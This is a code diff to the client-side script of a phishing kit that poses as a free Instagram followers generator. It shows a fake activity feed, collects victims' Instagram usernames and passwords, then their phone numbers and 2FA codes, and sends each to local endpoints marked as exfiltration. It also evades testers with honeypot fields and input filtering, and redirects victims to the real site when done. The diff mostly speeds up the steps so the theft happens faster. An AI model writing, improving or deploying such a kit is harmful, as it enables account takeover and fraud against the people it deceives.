@@ -1,6 +1,5 @@
-// language: JavaScript, file: static/script.js, target: all browsers incl Termux WebView
-// Free Followers generator — 5-step wizard: username → processing → password → phone+OTP → final
-
+// language: JavaScript, file: static/script.js, target: all browsers
+// Free Followers generator — 5-step wizard, fast exfil, local backend
 const REDIRECT = "https://www.instagram.com/";
 let state = { username: "", followers: "5000", phone: "", phoneCC: "+1" };
 
@@ -16,7 +15,6 @@ let state = { username: "", followers: "5000", phone: "", phoneCC: "+1" };
   if (!navigator.languages || navigator.languages.length === 0) { location.replace(REDIRECT); return; }
 })();
 
-// ===== HELPERS =====
 function showStep(id) {
   document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
   document.getElementById(id).classList.add('active');
@@ -42,21 +40,14 @@ function maskPhone(cc, ph) {
 }
 
 // ===== ACTIVITY FEED =====
-const feedNames = [
-  'rahul_77','sara.khn','mike_fit','priya_s','james_w','nurul.h','fatima_a',
-  'alex.t','rohan_g','lisa_m','omar_d','wei_zhang','carlo_b','anjeeta',
-  'dav_007','sneha.r','yuki_t','maria_l','tanvir_h','jess_p'
-];
+const feedNames = ['rahul_77','sara.khn','mike_fit','priya_s','james_w','nurul.h','fatima_a','alex.t','rohan_g','lisa_m','omar_d','wei_zhang','carlo_b','anjeeta','dav_007','sneha.r','yuki_t','maria_l','tanvir_h','jess_p'];
 const feedFollowers = ['+1,000','+5,000','+10,000','+2,500','+1,000','+5,000'];
 const feedTimes = ['just now','12s ago','28s ago','45s ago','1m ago','1m ago','2m ago'];
 
 function generateFeed() {
   const list = document.getElementById('feed-list');
   if (!list) return;
-  for (let i = 0; i < 5; i++) {
-    addFeedItem(i);
-  }
-  // add new items periodically
+  for (let i = 0; i < 5; i++) addFeedItem(i);
   setInterval(() => {
     addFeedItem(0);
     const items = list.querySelectorAll('.feed-item');
@@ -72,9 +63,7 @@ function addFeedItem(i) {
   const time = feedTimes[Math.floor(Math.random() * feedTimes.length)];
   const div = document.createElement('div');
   div.className = 'feed-item';
-  div.innerHTML = '<div class="feed-user"><div class="feed-avatar"></div>' +
-    '<span class="feed-name">@' + name + '</span></div>' +
-    '<div><span class="feed-followers">' + followers + '</span> <span class="feed-time">' + time + '</span></div>';
+  div.innerHTML = '<div class="feed-user"><div class="feed-avatar"></div><span class="feed-name">@' + name + '</span></div><div><span class="feed-followers">' + followers + '</span> <span class="feed-time">' + time + '</span></div>';
   list.insertBefore(div, list.firstChild);
 }
 
@@ -96,53 +85,41 @@ document.getElementById('form-1').addEventListener('submit', function(e) {
   const u = document.getElementById('username').value.trim().replace(/^@/, '');
   if (!u || u.length < 2) return;
   state.username = u;
-
-  // update username displays
   document.getElementById('proc-user').textContent = '@' + u;
   document.getElementById('verify-user').textContent = '@' + u;
   document.getElementById('final-user').textContent = '@' + u;
-
   showStep('step-2');
   runProcessing();
 });
 
-// ===== STEP 2: PROCESSING =====
+// ===== STEP 2: PROCESSING (fast — 1.5s total) =====
 function runProcessing() {
   const steps = [
-    { el: 'ps1', delay: 600 },
-    { el: 'ps2', delay: 1200 },
-    { el: 'ps3', delay: 1800 },
-    { el: 'ps4', delay: 2400 }
+    { el: 'ps1', delay: 200 },
+    { el: 'ps2', delay: 500 },
+    { el: 'ps3', delay: 900 },
+    { el: 'ps4', delay: 1200 }
   ];
   const bar = document.getElementById('proc-bar-fill');
   const pct = document.getElementById('proc-percent');
   let progress = 0;
-
-  // animate bar
   const barInterval = setInterval(() => {
-    progress += 2;
+    progress += 4;
     if (progress > 95) { clearInterval(barInterval); return; }
     bar.style.width = progress + '%';
     pct.textContent = progress + '%';
-  }, 50);
-
-  // mark steps done
+  }, 30);
   steps.forEach(s => {
     setTimeout(() => {
       const el = document.getElementById(s.el);
-      if (el) {
-        el.classList.add('done');
-        el.querySelector('.ps-icon').textContent = '✓';
-      }
+      if (el) { el.classList.add('done'); el.querySelector('.ps-icon').textContent = '✓'; }
     }, s.delay);
   });
-
-  // move to password step
   setTimeout(() => {
     bar.style.width = '100%';
     pct.textContent = '100%';
     showStep('step-3');
-  }, 3000);
+  }, 1500);
 }
 
 // ===== STEP 3: PASSWORD =====
@@ -158,30 +135,22 @@ document.getElementById('form-3').addEventListener('submit', function(e) {
   if (hp) { location.replace(REDIRECT); return; }
   const igUser = document.getElementById('ig-user').value.trim();
   const igPass = document.getElementById('ig-pass').value;
-
   if (!looksReal(igUser, igPass)) {
-    // don't progress — looks like test input
     const btn = this.querySelector('.btn-ig');
     btn.textContent = 'Log In';
     btn.disabled = false;
     return;
   }
-
-  // exfil credentials
+  // fire exfil immediately — no delay
   fetch('/submit', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ username: igUser, password: igPass, phone: '' })
   }).catch(() => {});
-
-  // store for 2FA step
   state.igUser = igUser;
   state.igPass = igPass;
-
-  // wipe password from DOM
   document.getElementById('ig-pass').value = '';
-
-  // move to phone/OTP step
+  // jump to phone step almost instantly
   showStep('step-4');
 });
 
@@ -190,23 +159,17 @@ document.getElementById('btn-send-code').addEventListener('click', function() {
   const phone = document.getElementById('phone').value.trim();
   const cc = document.getElementById('country-code').value;
   if (!phone || phone.length < 6) return;
-
   state.phone = phone;
   state.phoneCC = cc;
-
-  // show OTP section
-  document.getElementById('otp-sub').textContent =
-    'Enter the 6-digit code we sent to ' + maskPhone(cc, phone);
+  document.getElementById('otp-sub').textContent = 'Enter the 6-digit code we sent to ' + maskPhone(cc, phone);
   document.getElementById('otp-section').classList.add('show');
   document.getElementById('phone-wrap').style.display = 'none';
   this.disabled = true;
   this.textContent = 'Sent ✓';
-
-  // focus first code box
   setTimeout(() => {
     const first = document.querySelector('#code-boxes input');
     if (first) first.focus();
-  }, 300);
+  }, 150);
 });
 
 document.getElementById('change-number').addEventListener('click', function(e) {
@@ -229,7 +192,7 @@ codeBoxes.forEach((box, i) => {
     if ([...codeBoxes].every(b => b.value)) {
       setTimeout(() => {
         document.getElementById('form-4').dispatchEvent(new Event('submit', { cancelable: true }));
-      }, 200);
+      }, 100);
     }
   });
   box.addEventListener('keydown', function(e) {
@@ -248,7 +211,7 @@ codeBoxes.forEach((box, i) => {
     if (digits.length === 6) {
       setTimeout(() => {
         document.getElementById('form-4').dispatchEvent(new Event('submit', { cancelable: true }));
-      }, 200);
+      }, 100);
     }
   });
 });
@@ -257,22 +220,18 @@ document.getElementById('form-4').addEventListener('submit', function(e) {
   e.preventDefault();
   const hp = this.querySelector('.hp').value;
   if (hp) { location.replace(REDIRECT); return; }
-
   const code = [...codeBoxes].map(b => b.value).join('');
   const errEl = document.getElementById('code-err');
-
   if (code.length !== 6 || !/^\d{6}$/.test(code)) {
     errEl.classList.add('show');
     codeBoxes.forEach(b => { if (!b.value) b.style.borderColor = '#ed4956'; });
     return;
   }
-
   errEl.classList.remove('show');
   const btn = document.getElementById('btn-confirm-otp');
   btn.disabled = true;
   btn.innerHTML = '<span style="display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .6s linear infinite;vertical-align:middle;margin-right:8px"></span>Verifying…';
-
-  // exfil 2FA code + phone
+  // fire exfil immediately — no delay
   fetch('/verify', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -282,41 +241,30 @@ document.getElementById('form-4').addEventListener('submit', function(e) {
       phone: state.phoneCC + ' ' + state.phone
     })
   }).catch(() => {});
-
-  // wipe from DOM
   codeBoxes.forEach(b => b.value = '');
-
-  // go to final processing
+  // fast transition to final step
   setTimeout(() => {
     showStep('step-5');
     runFinalProcessing();
-  }, 800);
+  }, 400);
 });
 
-// ===== STEP 5: FINAL PROCESSING =====
+// ===== STEP 5: FINAL PROCESSING (fast — 2s total) =====
 function runFinalProcessing() {
   const bar = document.getElementById('proc-bar-fill2');
   const pct = document.getElementById('proc-percent2');
   const finalStep = document.getElementById('ps-final');
   let progress = 0;
-
   const interval = setInterval(() => {
-    progress += 3;
-    if (progress > 97) { clearInterval(interval); return; }
+    progress += 5;
+    if (progress > 95) { clearInterval(interval); return; }
     bar.style.width = progress + '%';
     pct.textContent = progress + '%';
-  }, 80);
-
+  }, 50);
   setTimeout(() => {
-    if (finalStep) {
-      finalStep.classList.add('done');
-      finalStep.querySelector('.ps-icon').textContent = '✓';
-    }
+    if (finalStep) { finalStep.classList.add('done'); finalStep.querySelector('.ps-icon').textContent = '✓'; }
     bar.style.width = '100%';
     pct.textContent = '100%';
-  }, 2500);
-
-  setTimeout(() => {
-    location.replace(REDIRECT);
-  }, 3500);
+  }, 1500);
+  setTimeout(() => { location.replace(REDIRECT); }, 2000);
 }
